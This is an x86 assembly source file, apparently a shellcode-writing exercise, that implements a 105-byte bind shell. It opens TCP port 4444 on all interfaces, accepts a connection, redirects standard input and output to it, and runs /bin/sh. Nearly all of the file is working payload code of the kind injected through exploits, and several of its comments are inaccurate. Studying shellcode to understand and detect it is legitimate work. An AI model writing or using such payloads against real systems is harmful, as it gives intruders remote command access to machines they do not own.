; Filename: shell_bind_tcp.nasm
; Author: h3ll0clar1c3
; Purpose: Bbind shellcode on TCP port 4444, spawn a shell on incoming connection
; Compilation: ./compile.sh shell_bind_tcp
; Usage: ./shell_bind_tcp
; Testing: nc -nv 127.0.0.1 4444
; Shellcode size: 105 bytes
; Architecture: x86

global   _start

section .text
        _start:

        ; initialize registers
        xor eax, eax
        xor ebx, ebx
        xor esi, esi

        ; push socket values onto the stack
        push esi        ; push 0 onto the stack, default protocol
        push 0x1        ; push 1 onto the stack, SOCK_STREAM
        push 0x2        ; push 2 onto the stack, AF_INET
	
        ; 1st syscall - create socket
        mov al, 0x66    ; hex value for socket
        mov bl, 0x1     ; socket
        mov ecx, esp    ; pointer to the arguments pushed
        int 0x80        ; call the interrupt to create the socket, execute the syscall
        mov edx, eax    ; save the return value

        ; 2nd syscall - bind socket to IP/Port in sockaddr struct
        push esi        ; push 0 for bind address 0.0.0.0
        push word 0x5c11; bind port 4444 is set
        push word 0x2   ; AF_INET
        mov ecx, esp    ; move esp into ecx, store the const struct sockaddr *addr argument
        push 0x16       ; length of sockaddr struct, 16
        push ecx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
        push edx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
        mov al, 0x66    ; hex value for socket
        mov bl, 2       ; sys_bind = 2
        mov ecx, esp    ; pointer to the arguments
        int 0x80        ; call the interrupt to execute the bind syscall

        ; 3rd syscall - listen for incoming connections
        push byte 0x1   ; listen for 1 client at a time
        push edx        ; pointer to stack
        mov al, 0x66    ; socketcall
        mov bl, 0x4     ; sys_listen = 4
        mov ecx, esp    ; pointer to the arguments pushed
        int 0x80        ; call the interrupt to execute the listen syscall

        ; 4th syscall - accept incoming connections
        push esi        ; NULL
        push esi        ; NULL
        push edx        ; pointer to sockfd
        mov al, 0x66    ; socketcall
        mov bl, 5       ; sys_accept = 5
        mov ecx, esp    ; pointer to arguments pushed
        int 0x80        ; call the interrupt to execute accept syscall

        ; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR
        mov edx, eax    ; save client file descriptor
	xor ecx, ecx	; clear ecx register
	mov cl, 3	; counter for file descriptors 0,1,2 (STDIN, STDOUT, STDERR)
	mov ebx, edx	; move socket into ebx (new int sockfd)

        loop_dup2:
        dec ecx         ; decrement ecx by 1 (new int sockfd)
	mov al, 0x3f  	; move the dup2 syscall code into the lower part of eax
        int 0x80      	; call interrupt to execute dup2 syscall
        jns loop_dup2   ; repeat for 1,0

        ; 6th syscall - execute /bin/sh using execve
        xor eax, eax	; clear eax register
	push eax        ; terminator placed onto the stack with value of 0
        push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
        push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
        mov ebx, esp    ; move pointer to '//bin/sh' into ebx, null terminated
        push eax        ; terminator placed onto the stack with value of 0
        mov edx, eax    ; move pointer to '//bin/sh' into edx, null terminated
        push ebx        ; push 0 onto the stack
        mov ecx, esp    ; move pointer to '//bin/sh' into ecx, null terminated
	mov al, 0xb     ; move syscall code for execve into al
        int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell
